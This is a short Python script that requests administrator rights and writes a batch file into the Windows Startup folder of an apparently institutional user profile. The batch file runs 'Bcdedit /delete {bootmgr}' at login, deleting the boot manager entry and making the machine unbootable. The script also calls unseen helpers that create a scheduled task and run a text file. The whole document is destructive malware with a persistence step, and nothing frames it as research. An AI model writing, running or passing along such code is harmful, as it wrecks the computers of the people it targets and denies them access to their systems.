import os
import pyuac
from files import Texto
from files import Tarefa
from pyuac import main_requires_admin

@main_requires_admin
def main():
    user = os.getlogin()
    caminho = os.path.join('C:\\', 'Users', user + '.EDU_FIESC', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'deleteboot.bat')

    comando = r'Bcdedit /delete {bootmgr}'

    with open(caminho, 'w') as file:
        file.write(comando)

def criar_tarefa_agendada():
    tarefa = Tarefa
    tarefa.criar_tarefa()

def criar_executar_texto():
    criarTexto = Texto
    criarTexto.criar_e_executar_texto()

main()
criar_tarefa_agendada()
criar_executar_texto()

if __name__ == "__main__":
    main()